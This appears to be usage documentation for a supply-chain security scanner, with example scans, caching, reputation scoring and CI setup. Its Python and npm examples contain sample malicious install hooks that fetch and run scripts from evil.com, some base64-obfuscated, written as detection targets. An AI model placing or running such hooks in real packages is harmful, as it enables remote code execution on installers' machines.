# Usage Examples

This document provides practical examples for using the Multi-Agent Security Analysis System.

## Table of Contents

- [Basic Usage](#basic-usage)
- [Python Project Analysis](#python-project-analysis)
- [npm Project Analysis](#npm-project-analysis)
- [Caching Examples](#caching-examples)
- [Reputation Scoring Examples](#reputation-scoring-examples)
- [Web Interface Examples](#web-interface-examples)
- [Advanced Usage](#advanced-usage)
- [Integration Examples](#integration-examples)

---

## Basic Usage

### Analyze a GitHub Repository

```bash
# Analyze a public GitHub repository
python main_github.py --repo https://github.com/expressjs/express

# Analyze a specific branch
python main_github.py --repo https://github.com/owner/repo --branch develop

# Analyze with custom output directory
python main_github.py --repo https://github.com/owner/repo --output ./results
```

### Analyze a Local Project

```bash
# Analyze current directory
python main_github.py --local .

# Analyze specific directory
python main_github.py --local /path/to/project

# Analyze with verbose output
python main_github.py --local /path/to/project --verbose
```

---

## Python Project Analysis

### Example 1: Analyzing setup.py

**Project Structure:**
```
my-python-project/
├── setup.py
├── requirements.txt
└── src/
    └── __init__.py
```

**setup.py:**
```python
from setuptools import setup
import os

# Suspicious: os.system call during installation
os.system("curl http://evil.com/malware.sh | bash")

setup(
    name="suspicious-package",
    version="1.0.0",
    packages=["src"],
)
```

**Analysis:**
```bash
python main_github.py --local ./my-python-project
```

**Expected Findings:**
```
🔴 CRITICAL: Malicious Python Script Detected
Package: suspicious-package
File: setup.py
Pattern: os.system() call
Evidence: Remote code execution during installation
Recommendation: Do not install this package
```

### Example 2: Analyzing requirements.txt

**requirements.txt:**
```
requests>=2.28.0
numpy==1.24.0
suspicious-typosquat==1.0.0  # Typosquatting attempt
```

**Analysis:**
```bash
python main_github.py --local ./my-python-project
```

**Expected Findings:**
```
🟡 MEDIUM: Suspicious Package Name
Package: suspicious-typosquat
Similarity to: requests (popular package)
Reputation Score: 0.15 (very low)
Recommendation: Verify package authenticity
```

### Example 3: Complex Python Analysis

**setup.py with obfuscation:**
```python
from setuptools import setup
import base64

# Obfuscated malicious code
exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgid2dldCBodHRwOi8vZXZpbC5jb20vc3RlYWwucHkiKQ=='))

setup(
    name="obfuscated-package",
    version="1.0.0",
)
```

**Analysis:**
```bash
python main_github.py --local ./obfuscated-project
```

**Expected Findings:**
```
🔴 CRITICAL: Obfuscated Code Execution
Package: obfuscated-package
File: setup.py
Pattern: exec() with base64 decoding
LLM Analysis: Code downloads and executes remote Python script
Confidence: 0.95
Recommendation: Malicious package - do not install
```

### Example 4: Legitimate Python Project

**setup.py (legitimate):**
```python
from setuptools import setup

setup(
    name="my-legitimate-package",
    version="1.0.0",
    packages=["mypackage"],
    install_requires=[
        "requests>=2.28.0",
        "numpy>=1.24.0",
    ],
)
```

**Analysis:**
```bash
python main_github.py --local ./legitimate-project
```

**Expected Findings:**
```
✅ No critical security issues found
📊 Reputation Scores:
  - requests: 0.95 (trusted)
  - numpy: 0.98 (trusted)
```

---

## npm Project Analysis

### Example 1: Malicious Install Script

**package.json:**
```json
{
  "name": "malicious-npm-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl http://evil.com/steal.sh | bash"
  }
}
```

**Analysis:**
```bash
python main_github.py --local ./malicious-npm-project
```

**Expected Findings:**
```
🔴 CRITICAL: Malicious Install Script
Package: malicious-npm-package
Script: postinstall
Pattern: Remote code execution via curl | bash
Evidence: Downloads and executes remote script
Recommendation: Do not install this package
```

### Example 2: Obfuscated npm Script

**package.json:**
```json
{
  "name": "obfuscated-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coJ21hbGljaW91cycpOw==', 'base64').toString())\""
  }
}
```

**Analysis:**
```bash
python main_github.py --local ./obfuscated-npm-project
```

**Expected Findings:**
```
🔴 CRITICAL: Obfuscated Code Execution
Package: obfuscated-package
Script: preinstall
Pattern: eval() with base64 encoding
LLM Analysis: Executes obfuscated JavaScript code
Confidence: 0.92
Recommendation: Highly suspicious - investigate before installing
```

### Example 3: Typosquatting Detection

**package.json:**
```json
{
  "name": "reqeusts",
  "version": "1.0.0",
  "description": "Typosquat of popular 'requests' package"
}
```

**Analysis:**
```bash
python main_github.py --local ./typosquat-project
```

**Expected Findings:**
```
🟡 MEDIUM: Potential Typosquatting
Package: reqeusts
Similar to: requests (popular package)
Levenshtein distance: 1
Reputation Score: 0.25 (low)
Recommendation: Verify package name spelling
```

---

## Caching Examples

### Example 1: Basic Cache Usage

```python
from tools.cache_manager import CacheManager

# Initialize cache
cache = CacheManager(backend="sqlite", ttl_hours=168)

# First analysis (cache miss)
script = "console.log('test');"
result = cache.get_llm_analysis(script)
if result is None:
    # Call LLM API
    result = analyze_with_llm(script)
    cache.store_llm_analysis(script, result)

# Second analysis (cache hit)
result = cache.get_llm_analysis(script)  # Returns cached result instantly
```

### Example 2: Cache Statistics

```python
from tools.cache_manager import CacheManager

cache = CacheManager()

# Perform multiple analyses
for project in projects:
    analyze_project(project)

# Check cache performance
stats = cache.get_stats()
print(f"Cache Statistics:")
print(f"  Hit Rate: {stats['hit_rate']:.1%}")
print(f"  Total Entries: {stats['total_entries']}")
print(f"  Cache Size: {stats['size_mb']:.1f} MB")
print(f"  Hits: {stats['hits']}")
print(f"  Misses: {stats['misses']}")
```

**Output:**
```
Cache Statistics:
  Hit Rate: 87.5%
  Total Entries: 245
  Cache Size: 12.3 MB
  Hits: 350
  Misses: 50
```

### Example 3: Cache Management

```python
from tools.cache_manager import CacheManager

cache = CacheManager()

# Clear expired entries
expired_count = cache.cleanup_expired()
print(f"Removed {expired_count} expired entries")

# Invalidate specific package
cache.invalidate_pattern("suspicious-package")

# Clear all cache
cache.clear()
print("Cache cleared")

# Verify cache is empty
stats = cache.get_stats()
assert stats['total_entries'] == 0
```

### Example 4: Redis Cache Backend

```python
from tools.cache_manager import CacheManager

# Use Redis for distributed caching
cache = CacheManager(
    backend="redis",
    redis_host="localhost",
    redis_port=6379,
    redis_db=0,
    ttl_hours=168
)

# Same API as SQLite backend
result = cache.get_llm_analysis(script_hash)
cache.store_llm_analysis(script_hash, result)
```

---

## Reputation Scoring Examples

### Example 1: Calculate Package Reputation

```python
from tools.reputation_service import ReputationScorer
from tools.ecosystem_analyzer import registry

scorer = ReputationScorer(registry)

# Analyze npm package
npm_rep = scorer.calculate_reputation("express", "npm")
print(f"Package: express")
print(f"Overall Score: {npm_rep['score']:.2f}")
print(f"Age Score: {npm_rep['factors']['age_score']:.2f}")
print(f"Downloads Score: {npm_rep['factors']['downloads_score']:.2f}")
print(f"Author Score: {npm_rep['factors']['author_score']:.2f}")
print(f"Maintenance Score: {npm_rep['factors']['maintenance_score']:.2f}")
print(f"Flags: {npm_rep['flags']}")

# Analyze Python package
python_rep = scorer.calculate_reputation("requests", "pypi")
print(f"\nPackage: requests")
print(f"Overall Score: {python_rep['score']:.2f}")
```

**Output:**
```
Package: express
Overall Score: 0.95
Age Score: 1.00
Downloads Score: 1.00
Author Score: 1.00
Maintenance Score: 0.85
Flags: []

Package: requests
Overall Score: 0.98
```

### Example 2: Identify Suspicious Packages

```python
from tools.reputation_service import ReputationScorer
from tools.ecosystem_analyzer import registry

scorer = ReputationScorer(registry)

packages = [
    ("express", "npm"),
    ("new-suspicious-pkg", "npm"),
    ("requests", "pypi"),
    ("unknown-python-pkg", "pypi"),
]

suspicious = []
for pkg_name, ecosystem in packages:
    rep = scorer.calculate_reputation(pkg_name, ecosystem)
    if rep['score'] < 0.3:
        suspicious.append({
            'name': pkg_name,
            'ecosystem': ecosystem,
            'score': rep['score'],
            'flags': rep['flags']
        })

print(f"Found {len(suspicious)} suspicious packages:")
for pkg in suspicious:
    print(f"  - {pkg['name']} ({pkg['ecosystem']}): {pkg['score']:.2f}")
    print(f"    Flags: {', '.join(pkg['flags'])}")
```

**Output:**
```
Found 2 suspicious packages:
  - new-suspicious-pkg (npm): 0.18
    Flags: new_package, low_downloads, unknown_author
  - unknown-python-pkg (pypi): 0.25
    Flags: new_package, low_downloads
```

### Example 3: Reputation-Based Filtering

```python
from tools.reputation_service import ReputationScorer
from tools.ecosystem_analyzer import registry

scorer = ReputationScorer(registry)

def should_flag_package(package_name, ecosystem, threshold=0.3):
    """Determine if package should be flagged based on reputation."""
    rep = scorer.calculate_reputation(package_name, ecosystem)
    
    if rep['score'] < threshold:
        return True, f"Low reputation: {rep['score']:.2f}"
    
    if 'new_package' in rep['flags'] and 'low_downloads' in rep['flags']:
        return True, "New package with low adoption"
    
    return False, "Package appears legitimate"

# Check packages
packages = ["express", "suspicious-new-pkg", "requests"]
for pkg in packages:
    should_flag, reason = should_flag_package(pkg, "npm")
    status = "🔴 FLAG" if should_flag else "✅ OK"
    print(f"{status} {pkg}: {reason}")
```

---

## Web Interface Examples

### Example 1: Upload and Analyze package.json

1. Start the web application:
```bash
python app.py
```

2. Open browser to `http://localhost:5000`

3. Upload `package.json`:
```json
{
  "name": "test-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "echo 'Installation complete'"
  },
  "dependencies": {
    "express": "^4.18.0"
  }
}
```

4. View results with:
   - Security findings
   - Reputation scores
   - Detailed analysis
   - Recommendations

### Example 2: Upload and Analyze requirements.txt

1. Upload `requirements.txt`:
```
requests>=2.28.0
numpy==1.24.0
pandas~=1.5.0
```

2. View analysis results:
   - Package reputation scores
   - Known vulnerabilities
   - Dependency tree
   - Security recommendations

### Example 3: Batch Analysis

```python
import requests

# Upload multiple files via API
files = [
    'package.json',
    'requirements.txt',
    'setup.py'
]

for file_path in files:
    with open(file_path, 'rb') as f:
        response = requests.post(
            'http://localhost:5000/analyze',
            files={'file': f}
        )
        result = response.json()
        print(f"Analysis for {file_path}:")
        print(f"  Findings: {len(result['findings'])}")
        print(f"  Reputation: {result['reputation_score']:.2f}")
```

---

## Advanced Usage

### Example 1: Custom Analyzer

```python
from tools.ecosystem_analyzer import EcosystemAnalyzer, registry
from typing import List, Dict, Any

class JavaAnalyzer(EcosystemAnalyzer):
    """Custom analyzer for Java/Maven projects."""
    
    @property
    def ecosystem_name(self) -> str:
        return "maven"
    
    def detect_manifest_files(self, directory: str) -> List[str]:
        import os
        pom_path = os.path.join(directory, 'pom.xml')
        return [pom_path] if os.path.exists(pom_path) else []
    
    def extract_dependencies(self, manifest_path: str) -> List[Dict[str, Any]]:
        # Parse pom.xml
        import xml.etree.ElementTree as ET
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        
        deps = []
        for dep in root.findall('.//{http://maven.apache.org/POM/4.0.0}dependency'):
            group_id = dep.find('{http://maven.apache.org/POM/4.0.0}groupId').text
            artifact_id = dep.find('{http://maven.apache.org/POM/4.0.0}artifactId').text
            version = dep.find('{http://maven.apache.org/POM/4.0.0}version')
            
            deps.append({
                'name': f"{group_id}:{artifact_id}",
                'version': version.text if version is not None else 'latest'
            })
        
        return deps
    
    def analyze_install_scripts(self, directory: str) -> List:
        # Analyze Maven plugins and build scripts
        return []
    
    def get_registry_url(self, package_name: str) -> str:
        return f"https://search.maven.org/solrsearch/select?q=g:{package_name}"
    
    def get_malicious_patterns(self) -> Dict[str, List[str]]:
        return {
            "critical": [r'Runtime\.getRuntime\(\)\.exec']
        }

# Register the analyzer
registry.register(JavaAnalyzer())

# Now Java projects are automatically detected
python main_github.py --local /path/to/java-project
```

### Example 2: Programmatic Analysis

```python
from analyze_supply_chain import analyze_project
from tools.cache_manager import CacheManager
from tools.reputation_service import ReputationScorer
from tools.ecosystem_analyzer import registry

# Initialize components
cache = CacheManager(backend="sqlite")
scorer = ReputationScorer(registry)

# Analyze project programmatically
results = analyze_project(
    project_path="/path/to/project",
    cache_manager=cache,
    reputation_scorer=scorer,
    enable_llm=True,
    verbose=True
)

# Process results
print(f"Analysis complete:")
print(f"  Total findings: {len(results['findings'])}")
print(f"  Critical: {sum(1 for f in results['findings'] if f['severity'] == 'critical')}")
print(f"  High: {sum(1 for f in results['findings'] if f['severity'] == 'high')}")
print(f"  Medium: {sum(1 for f in results['findings'] if f['severity'] == 'medium')}")

# Export results
import json
with open('analysis_results.json', 'w') as f:
    json.dump(results, f, indent=2)
```

### Example 3: Batch Project Analysis

```python
import os
from pathlib import Path
from analyze_supply_chain import analyze_project

projects = [
    "/path/to/project1",
    "/path/to/project2",
    "/path/to/project3",
]

results = {}
for project_path in projects:
    project_name = Path(project_path).name
    print(f"Analyzing {project_name}...")
    
    try:
        result = analyze_project(project_path)
        results[project_name] = {
            'status': 'success',
            'findings': len(result['findings']),
            'critical': sum(1 for f in result['findings'] if f['severity'] == 'critical')
        }
    except Exception as e:
        results[project_name] = {
            'status': 'error',
            'error': str(e)
        }

# Generate summary report
print("\n=== Analysis Summary ===")
for project, result in results.items():
    if result['status'] == 'success':
        print(f"{project}: {result['findings']} findings ({result['critical']} critical)")
    else:
        print(f"{project}: ERROR - {result['error']}")
```

---

## Integration Examples

### Example 1: CI/CD Integration (GitHub Actions)

**.github/workflows/security-scan.yml:**
```yaml
name: Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-analysis:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
      
      - name: Run security analysis
        env:
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: |
          python main_github.py --local . --output ./security-results
      
      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: security-analysis
          path: ./security-results
      
      - name: Check for critical findings
        run: |
          python -c "
          import json
          with open('./security-results/findings.json') as f:
              findings = json.load(f)
              critical = [f for f in findings if f['severity'] == 'critical']
              if critical:
                  print(f'Found {len(critical)} critical findings!')
                  exit(1)
          "
```

### Example 2: Pre-commit Hook

**.pre-commit-config.yaml:**
```yaml
repos:
  - repo: local
    hooks:
      - id: security-scan
        name: Security Analysis
        entry: python main_github.py --local . --fail-on-critical
        language: python
        pass_filenames: false
        always_run: true
```

**Install:**
```bash
pip install pre-commit
pre-commit install
```

### Example 3: API Integration

```python
from flask import Flask, request, jsonify
from analyze_supply_chain import analyze_project
import tempfile
import os

app = Flask(__name__)

@app.route('/api/analyze', methods=['POST'])
def analyze_api():
    """API endpoint for security analysis."""
    
    # Get uploaded file
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    
    # Save to temporary directory
    with tempfile.TemporaryDirectory() as tmpdir:
        file_path = os.path.join(tmpdir, file.filename)
        file.save(file_path)
        
        # Analyze
        try:
            results = analyze_project(tmpdir)
            return jsonify({
                'status': 'success',
                'findings': results['findings'],
                'reputation': results.get('reputation', {}),
                'summary': {
                    'total': len(results['findings']),
                    'critical': sum(1 for f in results['findings'] if f['severity'] == 'critical'),
                    'high': sum(1 for f in results['findings'] if f['severity'] == 'high'),
                }
            })
        except Exception as e:
            return jsonify({
                'status': 'error',
                'error': str(e)
            }), 500

if __name__ == '__main__':
    app.run(port=8080)
```

**Usage:**
```bash
# Start API server
python api_server.py

# Analyze file via API
curl -X POST http://localhost:8080/api/analyze \
  -F "file=@package.json" \
  | jq .
```

---

## Performance Optimization Examples

### Example 1: Optimize Cache Settings

```python
from tools.cache_manager import CacheManager

# Optimize for speed (more memory, less disk I/O)
cache = CacheManager(
    backend="memory",  # Fastest but not persistent
    ttl_hours=24       # Shorter TTL for fresh data
)

# Optimize for persistence (less memory, more disk I/O)
cache = CacheManager(
    backend="sqlite",
    ttl_hours=168,     # Longer TTL to reduce API calls
    max_size_mb=1000   # Larger cache
)

# Optimize for distributed systems
cache = CacheManager(
    backend="redis",
    redis_host="cache-server",
    ttl_hours=72
)
```

### Example 2: Parallel Analysis

```python
from concurrent.futures import ThreadPoolExecutor
from analyze_supply_chain import analyze_project

projects = [
    "/path/to/project1",
    "/path/to/project2",
    "/path/to/project3",
]

def analyze_with_error_handling(project_path):
    try:
        return analyze_project(project_path)
    except Exception as e:
        return {'error': str(e), 'path': project_path}

# Analyze projects in parallel
with ThreadPoolExecutor(max_workers=4) as executor:
    results = list(executor.map(analyze_with_error_handling, projects))

# Process results
for result in results:
    if 'error' in result:
        print(f"Error analyzing {result['path']}: {result['error']}")
    else:
        print(f"Analyzed {result['path']}: {len(result['findings'])} findings")
```

---

For more examples and detailed documentation, see:
- [README.md](README.md) - Main documentation
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Troubleshooting guide
- [tools/cache_manager_usage.md](tools/cache_manager_usage.md) - Cache usage guide
